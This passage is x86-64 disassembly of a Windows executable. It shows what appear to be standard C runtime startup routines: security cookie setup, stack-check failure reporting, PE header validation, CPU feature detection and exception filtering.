   140001e07:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001e0b:	75 54                	jne    0x140001e61
   140001e0d:	4c 2b c2             	sub    %rdx,%r8
   140001e10:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140001e14:	48 83 c2 18          	add    $0x18,%rdx
   140001e18:	48 03 d1             	add    %rcx,%rdx
   140001e1b:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140001e1f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001e23:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140001e27:	48 89 14 24          	mov    %rdx,(%rsp)
   140001e2b:	49 3b d1             	cmp    %r9,%rdx
   140001e2e:	74 18                	je     0x140001e48
   140001e30:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140001e33:	4c 3b c1             	cmp    %rcx,%r8
   140001e36:	72 0a                	jb     0x140001e42
   140001e38:	8b 42 08             	mov    0x8(%rdx),%eax
   140001e3b:	03 c1                	add    %ecx,%eax
   140001e3d:	4c 3b c0             	cmp    %rax,%r8
   140001e40:	72 08                	jb     0x140001e4a
   140001e42:	48 83 c2 28          	add    $0x28,%rdx
   140001e46:	eb df                	jmp    0x140001e27
   140001e48:	33 d2                	xor    %edx,%edx
   140001e4a:	48 85 d2             	test   %rdx,%rdx
   140001e4d:	75 04                	jne    0x140001e53
   140001e4f:	32 c0                	xor    %al,%al
   140001e51:	eb 14                	jmp    0x140001e67
   140001e53:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140001e57:	7d 04                	jge    0x140001e5d
   140001e59:	32 c0                	xor    %al,%al
   140001e5b:	eb 0a                	jmp    0x140001e67
   140001e5d:	b0 01                	mov    $0x1,%al
   140001e5f:	eb 06                	jmp    0x140001e67
   140001e61:	32 c0                	xor    %al,%al
   140001e63:	eb 02                	jmp    0x140001e67
   140001e65:	32 c0                	xor    %al,%al
   140001e67:	48 83 c4 18          	add    $0x18,%rsp
   140001e6b:	c3                   	ret
   140001e6c:	40 53                	rex push %rbx
   140001e6e:	48 83 ec 20          	sub    $0x20,%rsp
   140001e72:	8a d9                	mov    %cl,%bl
   140001e74:	e8 47 07 00 00       	call   0x1400025c0
   140001e79:	33 d2                	xor    %edx,%edx
   140001e7b:	85 c0                	test   %eax,%eax
   140001e7d:	74 0b                	je     0x140001e8a
   140001e7f:	84 db                	test   %bl,%bl
   140001e81:	75 07                	jne    0x140001e8a
   140001e83:	48 87 15 0e 38 00 00 	xchg   %rdx,0x380e(%rip)        # 0x140005698
   140001e8a:	48 83 c4 20          	add    $0x20,%rsp
   140001e8e:	5b                   	pop    %rbx
   140001e8f:	c3                   	ret
   140001e90:	40 53                	rex push %rbx
   140001e92:	48 83 ec 20          	sub    $0x20,%rsp
   140001e96:	80 3d 03 38 00 00 00 	cmpb   $0x0,0x3803(%rip)        # 0x1400056a0
   140001e9d:	8a d9                	mov    %cl,%bl
   140001e9f:	74 04                	je     0x140001ea5
   140001ea1:	84 d2                	test   %dl,%dl
   140001ea3:	75 0c                	jne    0x140001eb1
   140001ea5:	e8 36 01 00 00       	call   0x140001fe0
   140001eaa:	8a cb                	mov    %bl,%cl
   140001eac:	e8 2f 01 00 00       	call   0x140001fe0
   140001eb1:	b0 01                	mov    $0x1,%al
   140001eb3:	48 83 c4 20          	add    $0x20,%rsp
   140001eb7:	5b                   	pop    %rbx
   140001eb8:	c3                   	ret
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	40 53                	rex push %rbx
   140001ebe:	48 83 ec 20          	sub    $0x20,%rsp
   140001ec2:	48 83 3d de 37 00 00 	cmpq   $0xffffffffffffffff,0x37de(%rip)        # 0x1400056a8
   140001ec9:	ff 
   140001eca:	48 8b d9             	mov    %rcx,%rbx
   140001ecd:	75 07                	jne    0x140001ed6
   140001ecf:	e8 9e 07 00 00       	call   0x140002672
   140001ed4:	eb 0f                	jmp    0x140001ee5
   140001ed6:	48 8b d3             	mov    %rbx,%rdx
   140001ed9:	48 8d 0d c8 37 00 00 	lea    0x37c8(%rip),%rcx        # 0x1400056a8
   140001ee0:	e8 87 07 00 00       	call   0x14000266c
   140001ee5:	33 d2                	xor    %edx,%edx
   140001ee7:	85 c0                	test   %eax,%eax
   140001ee9:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001eed:	48 8b c2             	mov    %rdx,%rax
   140001ef0:	48 83 c4 20          	add    $0x20,%rsp
   140001ef4:	5b                   	pop    %rbx
   140001ef5:	c3                   	ret
   140001ef6:	cc                   	int3
   140001ef7:	cc                   	int3
   140001ef8:	48 83 ec 28          	sub    $0x28,%rsp
   140001efc:	e8 bb ff ff ff       	call   0x140001ebc
   140001f01:	48 f7 d8             	neg    %rax
   140001f04:	1b c0                	sbb    %eax,%eax
   140001f06:	f7 d8                	neg    %eax
   140001f08:	ff c8                	dec    %eax
   140001f0a:	48 83 c4 28          	add    $0x28,%rsp
   140001f0e:	c3                   	ret
   140001f0f:	cc                   	int3
   140001f10:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001f15:	55                   	push   %rbp
   140001f16:	48 8b ec             	mov    %rsp,%rbp
   140001f19:	48 83 ec 30          	sub    $0x30,%rsp
   140001f1d:	48 8b 05 dc 30 00 00 	mov    0x30dc(%rip),%rax        # 0x140005000
   140001f24:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001f2b:	2b 00 00 
   140001f2e:	48 3b c3             	cmp    %rbx,%rax
   140001f31:	75 74                	jne    0x140001fa7
   140001f33:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   140001f38:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001f3c:	ff 15 46 11 00 00    	call   *0x1146(%rip)        # 0x140003088
   140001f42:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001f46:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001f4a:	ff 15 40 11 00 00    	call   *0x1140(%rip)        # 0x140003090
   140001f50:	8b c0                	mov    %eax,%eax
   140001f52:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140001f56:	ff 15 3c 11 00 00    	call   *0x113c(%rip)        # 0x140003098
   140001f5c:	8b c0                	mov    %eax,%eax
   140001f5e:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001f62:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140001f66:	ff 15 34 11 00 00    	call   *0x1134(%rip)        # 0x1400030a0
   140001f6c:	8b 45 18             	mov    0x18(%rbp),%eax
   140001f6f:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001f73:	48 c1 e0 20          	shl    $0x20,%rax
   140001f77:	48 33 45 18          	xor    0x18(%rbp),%rax
   140001f7b:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140001f7f:	48 33 c1             	xor    %rcx,%rax
   140001f82:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001f89:	ff 00 00 
   140001f8c:	48 23 c1             	and    %rcx,%rax
   140001f8f:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140001f96:	2b 00 00 
   140001f99:	48 3b c3             	cmp    %rbx,%rax
   140001f9c:	48 0f 44 c1          	cmove  %rcx,%rax
   140001fa0:	48 89 05 59 30 00 00 	mov    %rax,0x3059(%rip)        # 0x140005000
   140001fa7:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001fac:	48 f7 d0             	not    %rax
   140001faf:	48 89 05 8a 30 00 00 	mov    %rax,0x308a(%rip)        # 0x140005040
   140001fb6:	48 83 c4 30          	add    $0x30,%rsp
   140001fba:	5d                   	pop    %rbp
   140001fbb:	c3                   	ret
   140001fbc:	33 c0                	xor    %eax,%eax
   140001fbe:	c3                   	ret
   140001fbf:	cc                   	int3
   140001fc0:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fc5:	c3                   	ret
   140001fc6:	cc                   	int3
   140001fc7:	cc                   	int3
   140001fc8:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001fcd:	c3                   	ret
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	48 8d 0d 09 37 00 00 	lea    0x3709(%rip),%rcx        # 0x1400056e0
   140001fd7:	48 ff 25 a2 10 00 00 	rex.W jmp *0x10a2(%rip)        # 0x140003080
   140001fde:	cc                   	int3
   140001fdf:	cc                   	int3
   140001fe0:	b0 01                	mov    $0x1,%al
   140001fe2:	c3                   	ret
   140001fe3:	cc                   	int3
   140001fe4:	c2 00 00             	ret    $0x0
   140001fe7:	cc                   	int3
   140001fe8:	48 8d 05 01 37 00 00 	lea    0x3701(%rip),%rax        # 0x1400056f0
   140001fef:	c3                   	ret
   140001ff0:	48 83 ec 28          	sub    $0x28,%rsp
   140001ff4:	e8 07 f0 ff ff       	call   0x140001000
   140001ff9:	48 83 08 24          	orq    $0x24,(%rax)
   140001ffd:	e8 e6 ff ff ff       	call   0x140001fe8
   140002002:	48 83 08 02          	orq    $0x2,(%rax)
   140002006:	48 83 c4 28          	add    $0x28,%rsp
   14000200a:	c3                   	ret
   14000200b:	cc                   	int3
   14000200c:	33 c0                	xor    %eax,%eax
   14000200e:	39 05 38 30 00 00    	cmp    %eax,0x3038(%rip)        # 0x14000504c
   140002014:	0f 94 c0             	sete   %al
   140002017:	c3                   	ret
   140002018:	48 8d 05 f9 36 00 00 	lea    0x36f9(%rip),%rax        # 0x140005718
   14000201f:	c3                   	ret
   140002020:	48 8d 05 e9 36 00 00 	lea    0x36e9(%rip),%rax        # 0x140005710
   140002027:	c3                   	ret
   140002028:	83 25 c9 36 00 00 00 	andl   $0x0,0x36c9(%rip)        # 0x1400056f8
   14000202f:	c3                   	ret
   140002030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002035:	55                   	push   %rbp
   140002036:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   14000203d:	ff 
   14000203e:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140002045:	8b d9                	mov    %ecx,%ebx
   140002047:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000204c:	ff 15 56 10 00 00    	call   *0x1056(%rip)        # 0x1400030a8
   140002052:	85 c0                	test   %eax,%eax
   140002054:	74 04                	je     0x14000205a
   140002056:	8b cb                	mov    %ebx,%ecx
   140002058:	cd 29                	int    $0x29
   14000205a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000205f:	e8 c4 ff ff ff       	call   0x140002028
   140002064:	33 d2                	xor    %edx,%edx
   140002066:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000206a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140002070:	e8 73 05 00 00       	call   0x1400025e8
   140002075:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002079:	ff 15 31 10 00 00    	call   *0x1031(%rip)        # 0x1400030b0
   14000207f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140002086:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   14000208d:	48 8b cb             	mov    %rbx,%rcx
   140002090:	45 33 c0             	xor    %r8d,%r8d
   140002093:	ff 15 9f 0f 00 00    	call   *0xf9f(%rip)        # 0x140003038
   140002099:	48 85 c0             	test   %rax,%rax
   14000209c:	74 3c                	je     0x1400020da
   14000209e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400020a4:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400020ab:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400020b2:	4c 8b c8             	mov    %rax,%r9
   1400020b5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400020ba:	4c 8b c3             	mov    %rbx,%r8
   1400020bd:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400020c4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400020c9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400020cd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400020d2:	33 c9                	xor    %ecx,%ecx
   1400020d4:	ff 15 66 0f 00 00    	call   *0xf66(%rip)        # 0x140003040
   1400020da:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400020e1:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400020e6:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400020ed:	33 d2                	xor    %edx,%edx
   1400020ef:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400020f6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400020fc:	48 83 c0 08          	add    $0x8,%rax
   140002100:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140002107:	e8 dc 04 00 00       	call   0x1400025e8
   14000210c:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140002113:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002118:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000211f:	40 
   140002120:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140002127:	00 
   140002128:	ff 15 4a 0f 00 00    	call   *0xf4a(%rip)        # 0x140003078
   14000212e:	8b d8                	mov    %eax,%ebx
   140002130:	33 c9                	xor    %ecx,%ecx
   140002132:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002137:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000213c:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140002140:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002145:	ff 15 05 0f 00 00    	call   *0xf05(%rip)        # 0x140003050
   14000214b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002150:	ff 15 f2 0e 00 00    	call   *0xef2(%rip)        # 0x140003048
   140002156:	85 c0                	test   %eax,%eax
   140002158:	75 0d                	jne    0x140002167
   14000215a:	83 fb 01             	cmp    $0x1,%ebx
   14000215d:	74 08                	je     0x140002167
   14000215f:	8d 48 03             	lea    0x3(%rax),%ecx
   140002162:	e8 c1 fe ff ff       	call   0x140002028
   140002167:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000216e:	00 
   14000216f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140002176:	5d                   	pop    %rbp
   140002177:	c3                   	ret
   140002178:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000217f:	33 d2                	xor    %edx,%edx
   140002181:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002186:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000218a:	e8 59 04 00 00       	call   0x1400025e8
   14000218f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002194:	ff 15 d6 0e 00 00    	call   *0xed6(%rip)        # 0x140003070
   14000219a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000219f:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400021a4:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   1400021aa:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400021b1:	c3                   	ret
   1400021b2:	cc                   	int3
   1400021b3:	cc                   	int3
   1400021b4:	e9 03 fe ff ff       	jmp    0x140001fbc
   1400021b9:	cc                   	int3
   1400021ba:	cc                   	int3
   1400021bb:	cc                   	int3
   1400021bc:	48 83 ec 28          	sub    $0x28,%rsp
   1400021c0:	33 c9                	xor    %ecx,%ecx
   1400021c2:	ff 15 a0 0e 00 00    	call   *0xea0(%rip)        # 0x140003068
   1400021c8:	48 85 c0             	test   %rax,%rax
   1400021cb:	74 39                	je     0x140002206
   1400021cd:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400021d2:	66 39 08             	cmp    %cx,(%rax)
   1400021d5:	75 2f                	jne    0x140002206
   1400021d7:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400021db:	48 03 c8             	add    %rax,%rcx
   1400021de:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400021e4:	75 20                	jne    0x140002206
   1400021e6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400021eb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400021ef:	75 15                	jne    0x140002206
   1400021f1:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400021f8:	76 0c                	jbe    0x140002206
   1400021fa:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140002201:	0f 95 c0             	setne  %al
   140002204:	eb 02                	jmp    0x140002208
   140002206:	32 c0                	xor    %al,%al
   140002208:	48 83 c4 28          	add    $0x28,%rsp
   14000220c:	c3                   	ret
   14000220d:	cc                   	int3
   14000220e:	cc                   	int3
   14000220f:	cc                   	int3
   140002210:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140002220
   140002217:	48 ff 25 32 0e 00 00 	rex.W jmp *0xe32(%rip)        # 0x140003050
   14000221e:	cc                   	int3
   14000221f:	cc                   	int3
   140002220:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002225:	57                   	push   %rdi
   140002226:	48 83 ec 20          	sub    $0x20,%rsp
   14000222a:	48 8b 19             	mov    (%rcx),%rbx
   14000222d:	48 8b f9             	mov    %rcx,%rdi
   140002230:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002236:	75 1c                	jne    0x140002254
   140002238:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000223c:	75 16                	jne    0x140002254
   14000223e:	8b 53 20             	mov    0x20(%rbx),%edx
   140002241:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   140002247:	83 f8 02             	cmp    $0x2,%eax
   14000224a:	76 15                	jbe    0x140002261
   14000224c:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140002252:	74 0d                	je     0x140002261
   140002254:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002259:	33 c0                	xor    %eax,%eax
   14000225b:	48 83 c4 20          	add    $0x20,%rsp
   14000225f:	5f                   	pop    %rdi
   140002260:	c3                   	ret
   140002261:	e8 76 03 00 00       	call   0x1400025dc
   140002266:	48 89 18             	mov    %rbx,(%rax)
   140002269:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000226d:	e8 70 03 00 00       	call   0x1400025e2
   140002272:	48 89 18             	mov    %rbx,(%rax)
   140002275:	e8 fe 03 00 00       	call   0x140002678
   14000227a:	cc                   	int3
   14000227b:	cc                   	int3
   14000227c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002281:	57                   	push   %rdi
   140002282:	48 83 ec 20          	sub    $0x20,%rsp
   140002286:	48 8d 1d 23 1a 00 00 	lea    0x1a23(%rip),%rbx        # 0x140003cb0
   14000228d:	48 8d 3d 1c 1a 00 00 	lea    0x1a1c(%rip),%rdi        # 0x140003cb0
   140002294:	eb 12                	jmp    0x1400022a8
   140002296:	48 8b 03             	mov    (%rbx),%rax
   140002299:	48 85 c0             	test   %rax,%rax
   14000229c:	74 06                	je     0x1400022a4
   14000229e:	ff 15 f4 0f 00 00    	call   *0xff4(%rip)        # 0x140003298
   1400022a4:	48 83 c3 08          	add    $0x8,%rbx
   1400022a8:	48 3b df             	cmp    %rdi,%rbx
   1400022ab:	72 e9                	jb     0x140002296
   1400022ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400022b2:	48 83 c4 20          	add    $0x20,%rsp
   1400022b6:	5f                   	pop    %rdi
   1400022b7:	c3                   	ret
   1400022b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400022bd:	57                   	push   %rdi
   1400022be:	48 83 ec 20          	sub    $0x20,%rsp
   1400022c2:	48 8d 1d f7 19 00 00 	lea    0x19f7(%rip),%rbx        # 0x140003cc0
   1400022c9:	48 8d 3d f0 19 00 00 	lea    0x19f0(%rip),%rdi        # 0x140003cc0
   1400022d0:	eb 12                	jmp    0x1400022e4
   1400022d2:	48 8b 03             	mov    (%rbx),%rax
   1400022d5:	48 85 c0             	test   %rax,%rax
   1400022d8:	74 06                	je     0x1400022e0
   1400022da:	ff 15 b8 0f 00 00    	call   *0xfb8(%rip)        # 0x140003298
   1400022e0:	48 83 c3 08          	add    $0x8,%rbx
   1400022e4:	48 3b df             	cmp    %rdi,%rbx
   1400022e7:	72 e9                	jb     0x1400022d2
   1400022e9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400022ee:	48 83 c4 20          	add    $0x20,%rsp
   1400022f2:	5f                   	pop    %rdi
   1400022f3:	c3                   	ret
   1400022f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400022f9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400022fe:	55                   	push   %rbp
   1400022ff:	57                   	push   %rdi
   140002300:	41 56                	push   %r14
   140002302:	48 8b ec             	mov    %rsp,%rbp
   140002305:	48 83 ec 10          	sub    $0x10,%rsp
   140002309:	33 c0                	xor    %eax,%eax
   14000230b:	33 c9                	xor    %ecx,%ecx
   14000230d:	0f a2                	cpuid
   14000230f:	44 8b c1             	mov    %ecx,%r8d
   140002312:	44 8b d2             	mov    %edx,%r10d
   140002315:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   14000231c:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140002323:	44 8b cb             	mov    %ebx,%r9d
   140002326:	44 8b f0             	mov    %eax,%r14d
   140002329:	33 c9                	xor    %ecx,%ecx
   14000232b:	b8 01 00 00 00       	mov    $0x1,%eax
   140002330:	0f a2                	cpuid
   140002332:	45 0b d0             	or     %r8d,%r10d
   140002335:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140002338:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   14000233f:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140002342:	45 0b d1             	or     %r9d,%r10d
   140002345:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140002348:	8b f9                	mov    %ecx,%edi
   14000234a:	89 55 fc             	mov    %edx,-0x4(%rbp)
   14000234d:	75 5b                	jne    0x1400023aa
   14000234f:	48 83 0d 11 2d 00 00 	orq    $0xffffffffffffffff,0x2d11(%rip)        # 0x140005068
   140002356:	ff 
   140002357:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000235c:	48 c7 05 f9 2c 00 00 	movq   $0x8000,0x2cf9(%rip)        # 0x140005060
   140002363:	00 80 00 00 
   140002367:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000236c:	74 28                	je     0x140002396
   14000236e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140002373:	74 21                	je     0x140002396
   140002375:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000237a:	74 1a                	je     0x140002396
   14000237c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140002381:	83 f8 20             	cmp    $0x20,%eax
   140002384:	77 24                	ja     0x1400023aa
   140002386:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000238d:	00 00 00 
   140002390:	48 0f a3 c1          	bt     %rax,%rcx
   140002394:	73 14                	jae    0x1400023aa
   140002396:	44 8b 05 63 33 00 00 	mov    0x3363(%rip),%r8d        # 0x140005700
   14000239d:	41 83 c8 01          	or     $0x1,%r8d
   1400023a1:	44 89 05 58 33 00 00 	mov    %r8d,0x3358(%rip)        # 0x140005700
   1400023a8:	eb 07                	jmp    0x1400023b1
   1400023aa:	44 8b 05 4f 33 00 00 	mov    0x334f(%rip),%r8d        # 0x140005700
   1400023b1:	45 33 c9             	xor    %r9d,%r9d
   1400023b4:	41 8b f1             	mov    %r9d,%esi
   1400023b7:	45 8b d1             	mov    %r9d,%r10d
   1400023ba:	45 8b d9             	mov    %r9d,%r11d
   1400023bd:	41 83 fe 07          	cmp    $0x7,%r14d
   1400023c1:	7c 65                	jl     0x140002428
   1400023c3:	41 8d 41 07          	lea    0x7(%r9),%eax
   1400023c7:	33 c9                	xor    %ecx,%ecx
   1400023c9:	0f a2                	cpuid
   1400023cb:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400023ce:	8b f2                	mov    %edx,%esi
   1400023d0:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   1400023d3:	44 8b cb             	mov    %ebx,%r9d
   1400023d6:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1400023d9:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400023dc:	0f ba e3 09          	bt     $0x9,%ebx
   1400023e0:	73 0b                	jae    0x1400023ed
   1400023e2:	41 83 c8 02          	or     $0x2,%r8d
   1400023e6:	44 89 05 13 33 00 00 	mov    %r8d,0x3313(%rip)        # 0x140005700
   1400023ed:	83 f8 01             	cmp    $0x1,%eax
   1400023f0:	7c 19                	jl     0x14000240b
   1400023f2:	b8 07 00 00 00       	mov    $0x7,%eax
   1400023f7:	8d 48 fa             	lea    -0x6(%rax),%ecx
   1400023fa:	0f a2                	cpuid
   1400023fc:	44 8b d2             	mov    %edx,%r10d
   1400023ff:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140002402:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140002405:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140002408:	89 55 fc             	mov    %edx,-0x4(%rbp)
   14000240b:	b8 24 00 00 00       	mov    $0x24,%eax
   140002410:	44 3b f0             	cmp    %eax,%r14d
   140002413:	7c 13                	jl     0x140002428
   140002415:	33 c9                	xor    %ecx,%ecx
   140002417:	0f a2                	cpuid
   140002419:	44 8b db             	mov    %ebx,%r11d
   14000241c:	89 45 f0             	mov    %eax,-0x10(%rbp)
   14000241f:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140002422:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140002425:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140002428:	48 8b 05 21 2c 00 00 	mov    0x2c21(%rip),%rax        # 0x140005050
   14000242f:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002434:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140002438:	c7 05 16 2c 00 00 01 	movl   $0x1,0x2c16(%rip)        # 0x140005058
   14000243f:	00 00 00 
   140002442:	c7 05 10 2c 00 00 02 	movl   $0x2,0x2c10(%rip)        # 0x14000505c
   140002449:	00 00 00 
   14000244c:	48 89 05 fd 2b 00 00 	mov    %rax,0x2bfd(%rip)        # 0x140005050
   140002453:	0f ba e7 14          	bt     $0x14,%edi
   140002457:	73 1b                	jae    0x140002474
   140002459:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   14000245d:	c7 05 f1 2b 00 00 02 	movl   $0x2,0x2bf1(%rip)        # 0x140005058
   140002464:	00 00 00 
   140002467:	48 89 05 e2 2b 00 00 	mov    %rax,0x2be2(%rip)        # 0x140005050
   14000246e:	89 1d e8 2b 00 00    	mov    %ebx,0x2be8(%rip)        # 0x14000505c
   140002474:	0f ba e7 1b          	bt     $0x1b,%edi
   140002478:	0f 83 2b 01 00 00    	jae    0x1400025a9
   14000247e:	33 c9                	xor    %ecx,%ecx
   140002480:	0f 01 d0             	xgetbv
   140002483:	48 c1 e2 20          	shl    $0x20,%rdx
   140002487:	48 0b d0             	or     %rax,%rdx
   14000248a:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   14000248e:	0f ba e7 1c          	bt     $0x1c,%edi
   140002492:	0f 83 f6 00 00 00    	jae    0x14000258e
   140002498:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000249c:	22 c3                	and    %bl,%al
   14000249e:	3a c3                	cmp    %bl,%al
   1400024a0:	0f 85 e8 00 00 00    	jne    0x14000258e
   1400024a6:	8b 05 b0 2b 00 00    	mov    0x2bb0(%rip),%eax        # 0x14000505c
   1400024ac:	b2 e0                	mov    $0xe0,%dl
   1400024ae:	83 c8 08             	or     $0x8,%eax
   1400024b1:	c7 05 9d 2b 00 00 03 	movl   $0x3,0x2b9d(%rip)        # 0x140005058
   1400024b8:	00 00 00 
   1400024bb:	89 05 9b 2b 00 00    	mov    %eax,0x2b9b(%rip)        # 0x14000505c
   1400024c1:	41 f6 c1 20          	test   $0x20,%r9b
   1400024c5:	74 5d                	je     0x140002524
   1400024c7:	83 c8 20             	or     $0x20,%eax
   1400024ca:	c7 05 84 2b 00 00 05 	movl   $0x5,0x2b84(%rip)        # 0x140005058
   1400024d1:	00 00 00 
   1400024d4:	89 05 82 2b 00 00    	mov    %eax,0x2b82(%rip)        # 0x14000505c
   1400024da:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   1400024df:	48 8b 05 6a 2b 00 00 	mov    0x2b6a(%rip),%rax        # 0x140005050
   1400024e6:	44 23 c9             	and    %ecx,%r9d
   1400024e9:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   1400024ed:	48 89 05 5c 2b 00 00 	mov    %rax,0x2b5c(%rip)        # 0x140005050
   1400024f4:	44 3b c9             	cmp    %ecx,%r9d
   1400024f7:	75 32                	jne    0x14000252b
   1400024f9:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400024fd:	22 c2                	and    %dl,%al
   1400024ff:	3a c2                	cmp    %dl,%al
   140002501:	75 21                	jne    0x140002524
   140002503:	48 8b 05 46 2b 00 00 	mov    0x2b46(%rip),%rax        # 0x140005050
   14000250a:	83 0d 4b 2b 00 00 40 	orl    $0x40,0x2b4b(%rip)        # 0x14000505c
   140002511:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
